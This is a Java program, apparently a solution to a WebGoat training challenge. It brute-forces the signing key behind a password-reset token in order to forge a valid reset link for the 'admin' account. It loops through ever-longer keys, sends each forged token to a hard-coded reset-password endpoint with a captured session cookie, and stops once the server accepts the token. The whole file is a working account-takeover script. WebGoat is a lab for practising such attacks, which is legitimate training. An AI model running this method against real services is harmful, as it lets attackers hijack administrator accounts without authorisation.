/******************************************************************************

                            Online Java Compiler.
                Code, Compile, Run and Debug java program online.
Write your code in this editor and press "Run" button to execute it.

*******************************************************************************/
import java.io.BufferedReader;
import java.lang.StringBuffer;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Main3
{
    private static String FOUND = "NONE";
    // https://www.journaldev.com/7148/java-httpurlconnection-example-java-http-request-get-post
    private static void sendGET(String token) throws IOException {
		URL obj = new URL("http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/" + token);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("GET");
        // https://examples.javacodegeeks.com/core-java/net/urlconnection/send-cookie-with-http-request/
        con.setRequestProperty("Cookie", "JSESSIONID=IjR_vXm0O83oXkF376e5pM7nLxuJ2xk_80h-ryqH");
		int responseCode = con.getResponseCode();
		System.out.println("GET Response Code :: " + responseCode);
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        // print result
        // System.out.println(response.toString());
        String res = response.toString();
        System.out.println("Debug");
        System.out.println(res);
        if (!res.contains("That is not the reset link for admin")) {
            System.out.println(res);
            System.out.println(token);
            System.exit(0);
        } else if (res.contains("That is not the reset link for admin")) {
            System.out.println("Not yet!");
        }

	}
    public static void main(String[] args) {

        String username = "admin";
        String key = "w";
        ;
        int i = 0;
        
        while (true) {
            if (i >= 0) {
                System.out.println("Length = " + i);
                String token = new PasswordResetLink().createPasswordReset(username, key);
                try {
                    sendGET(token);
                } catch(Exception ex) {
                    System.out.println("Error");
                }
                
            }
            key = key + "w";
            i++;
        }
        
    }
}
